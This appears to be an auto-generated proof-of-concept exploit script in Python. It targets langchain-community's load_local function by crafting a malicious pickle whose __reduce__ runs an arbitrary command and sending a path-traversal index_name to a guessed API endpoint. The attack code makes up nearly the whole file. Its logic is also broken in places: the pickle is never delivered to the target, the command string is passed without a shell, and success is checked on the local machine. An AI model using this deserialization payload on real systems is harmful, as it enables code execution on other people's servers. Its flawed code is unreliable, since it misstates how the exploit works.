#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-013
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The function uses pickle.load on a file path constructed from
user-controlled folder_path and index_name without proper validation. An attacker
can control these parameters to load a malicious pickle file, leading to arbitrary
code execution.

The exploit works by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in the index_name parameter to point to the malicious file
3. Calling load_local with allow_dangerous_deserialization=True

Usage:
    python3 exploit.py --target http://victim:8080 --folder /tmp --index "../../tmp/evil"
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

def create_malicious_pickle(payload_command: str) -> str:
    """
    Create a malicious pickle file that executes the given command when deserialized.
    
    Args:
        payload_command: Command to execute (e.g., "touch /tmp/poc_success.txt")
    
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        """Class that executes a command when unpickled."""
        def __reduce__(self):
            return (subprocess.check_output, (payload_command,))
    
    # Create a temporary file for the malicious pickle
    fd, temp_path = tempfile.mkstemp(suffix='.pkl')
    os.close(fd)
    
    # Write the malicious pickle
    with open(temp_path, 'wb') as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file at: {temp_path}")
    print(f"[+] Payload command: {payload_command}")
    return temp_path

def exploit(target_url: str, folder_path: str, index_name: str, payload_command: str = "touch /tmp/poc_success.txt"):
    """
    Execute the exploit against the target.
    
    Args:
        target_url: Base URL of the vulnerable service
        folder_path: The folder_path parameter to pass to load_local
        index_name: The index_name parameter (with path traversal)
        payload_command: Command to execute on the target
    """
    # Step 1: Create the malicious pickle file
    malicious_pickle_path = create_malicious_pickle(payload_command)
    
    # Step 2: Construct the API endpoint (assuming standard FastAPI/Flask endpoint)
    # The actual endpoint path may vary - adjust as needed
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # Step 3: Prepare the payload
    # The index_name uses path traversal to point to our malicious file
    # We need to ensure the path traversal goes to the temp directory
    # where we placed the malicious pickle
    malicious_index = f"../../tmp/{os.path.basename(malicious_pickle_path).replace('.pkl', '')}"
    
    payload = {
        "folder_path": folder_path,
        "index_name": malicious_index,
        "allow_dangerous_deserialization": True
    }
    
    print(f"[*] Sending exploit payload to {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        # Step 4: Send the exploit request
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10
        )
        
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Step 5: Verify exploitation
        time.sleep(1)  # Give time for command execution
        
        # Check if the command was executed (for the benign payload)
        if payload_command == "touch /tmp/poc_success.txt":
            check_result = subprocess.run(
                ["ls", "-la", "/tmp/poc_success.txt"],
                capture_output=True,
                text=True
            )
            if check_result.returncode == 0:
                print("[+] SUCCESS: Command executed on target!")
                print(f"[+] File /tmp/poc_success.txt exists: {check_result.stdout}")
            else:
                print("[-] Could not verify command execution on local machine")
                print("[-] The command may have executed on the remote target")
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target")
        print("[-] Make sure the target URL is correct and the service is running")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    # Cleanup: Remove the malicious pickle file
    try:
        os.remove(malicious_pickle_path)
        print(f"[+] Cleaned up malicious pickle file: {malicious_pickle_path}")
    except OSError:
        pass

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://victim:8080)"
    )
    parser.add_argument(
        "--folder",
        default="/tmp",
        help="folder_path parameter (default: /tmp)"
    )
    parser.add_argument(
        "--index",
        default="../../tmp/evil",
        help="index_name parameter with path traversal (default: ../../tmp/evil)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute on target (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    
    print("[*] langchain-community RCE PoC Exploit")
    print("[*] ===================================")
    print(f"[*] Target: {args.target}")
    print(f"[*] Folder: {args.folder}")
    print(f"[*] Index: {args.index}")
    print(f"[*] Command: {args.command}")
    print()
    
    exploit(args.target, args.folder, args.index, args.command)

if __name__ == "__main__":
    main()
